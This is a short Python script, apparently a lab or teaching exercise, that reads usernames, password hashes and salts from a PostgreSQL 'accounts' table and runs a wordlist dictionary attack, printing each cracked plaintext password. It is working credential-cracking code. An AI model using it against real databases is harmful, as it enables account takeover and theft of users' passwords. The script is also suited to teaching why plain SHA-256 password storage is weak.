import psycopg2
import hashlib
import os
import sys
from dotenv import load_dotenv # installed in a virtual environment

load_dotenv()  # Loads from .env file in the same directory

# PostgreSQL configuration
DB_NAME = os.getenv("DB_NAME")
DB_USER = os.getenv("DB_USER")
DB_PASS = os.getenv("DB_PASS")
DB_HOST = os.getenv("DB_HOST")
DB_PORT = os.getenv("DB_PORT")

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def hash_with_salt(password, salt):
    return hashlib.sha256((salt + password).encode()).hexdigest()

def load_dictionary(file_path):
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def dictionary_attack(dictionary_file):
    conn = psycopg2.connect(
        dbname=DB_NAME,
        user=DB_USER,
        password=DB_PASS,
        host=DB_HOST,
        port=DB_PORT
    )
    cursor = conn.cursor()

    cracked_accounts = []

    try:
        # Load candidate passwords
        candidates = load_dictionary(dictionary_file)

        # Check if salt column exists
        cursor.execute("""
            SELECT column_name FROM information_schema.columns 
            WHERE table_name='accounts' AND column_name='salt';
        """)
        salted = cursor.fetchone() is not None

        # Get all user info
        if salted:
            cursor.execute("SELECT username, password, salt FROM accounts;")
        else:
            cursor.execute("SELECT username, password FROM accounts;")
        
        accounts = cursor.fetchall()

        print("Starting dictionary attack...\n")
        for account in accounts:
            username = account[0]
            stored_password = account[1]
            salt = account[2] if salted else None

            for guess in candidates:
                if salted:
                    guess_hash = hash_with_salt(guess, salt)
                else:
                    guess_hash = hash_password(guess)

                if guess_hash == stored_password or guess == stored_password:
                    print(f"..!....!....!..Cracked {username}: {guess}")
                    cracked_accounts.append((username, guess))
                    break
            else:
                print(f"Failed to crack {username}")
    
    except Exception as e:
        print(f"Error: {e}")
    finally:
        cursor.close()
        conn.close()
    return cracked_accounts

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python dictionary_attack.py passwords.txt")
    else:
        cracked = dictionary_attack(sys.argv[1])
        print("\nResults:")
        for username, password in cracked:
            print(f"{username}: {password}")

